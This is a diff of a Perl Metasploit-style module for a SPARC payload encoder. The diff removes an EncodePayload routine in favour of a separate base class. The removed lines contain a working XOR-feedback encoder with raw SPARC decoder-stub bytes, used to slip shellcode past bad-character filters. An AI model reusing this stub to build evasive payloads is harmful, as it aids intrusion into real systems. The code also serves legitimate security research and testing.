@@ -9,8 +9,9 @@
 
 package Msf::Encoder::Sparc;
 use strict;
-use base 'Msf::Encoder';
-use Pex::Encoding::XorDwordFeedbackN;
+# use the base from the lib/Msf/Encoder dir
+# makes for easier standalone use...
+use base 'Msf::Encoder::_Sparc';
 use Pex::SPARC;
 
 my $advanced = 
@@ -33,50 +34,8 @@ sub new {
     return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
 }
 
-sub EncodePayload {
-    my $self     = shift;
-    my $payload  = shift;
-    my $badchars = shift;
+# I'm a fun msf module stub, mostly just for info data, see
+# lib/Msf/Encoder/_Sparc.pm for the real dealz yall
 
-    # Check for a null dword in the payload first, this will break the decoder
-    my $check = $payload;
-    while (length($check)) {
-    	my $word = substr($check, 0, 4, '');
-        if ($word eq pack('N', 0)) {
-        	$self->PrintLine("[*] Sparc decoder is not able to handle null dwords in the payload");
-        	return;
-        }  
-    }
-
-    # Append a null to the payload, this becomes the end tag
-    $payload .= pack('N', 0);
-
-    my $xor_key = Pex::Encoding::XorDwordFeedbackN->KeyScan($payload, $badchars);
-    if(!$xor_key) {
-        $self->PrintDebugLine(3, 'Failed to find xor key');
-        return;                                            
-    }
-
-    my $xor_data = Pex::Encoding::XorDwordFeedbackN->Encode($xor_key, $payload);
-
-    # Flip the key endian-ness
-    $xor_key = unpack('V', pack('N', $xor_key));
-
-    my $encoder = 
-	Pex::SPARC::set($xor_key, "l1").
-        "\x20\xbf\xff\xff".   # /* bn,a  _start - 4 */
-        "\x20\xbf\xff\xff".   # /* bn,a  _start     */
-        "\x7f\xff\xff\xff".   # /* call  _start + 4 */
-        "\xea\x03\xe0\x20".   # /* ld    [%o7 + 0x20],%l7 */
-        "\xaa\x9d\x40\x11".   # /* xorcc %l5,%l1,%l5 */
-        "\xea\x23\xe0\x20".   # /* st    %l5,[%o7 + 0x20] */
-        "\xa2\x04\x40\x15".   # /* add   %l1,%l5,%l1 */
-        "\x81\xdb\xe0\x20".   # /* flush %o7 + 0x20 */
-        "\x12\xbf\xff\xfb".   # /* bnz   dec_loop */
-        "\x9e\x03\xe0\x04";   # /* add   %o7,4,%o7 */
-    
-    # XXX - We do not check to see if the split bitshifted key is a badchar!
-    return $encoder . $xor_data;
-}
 
 1;
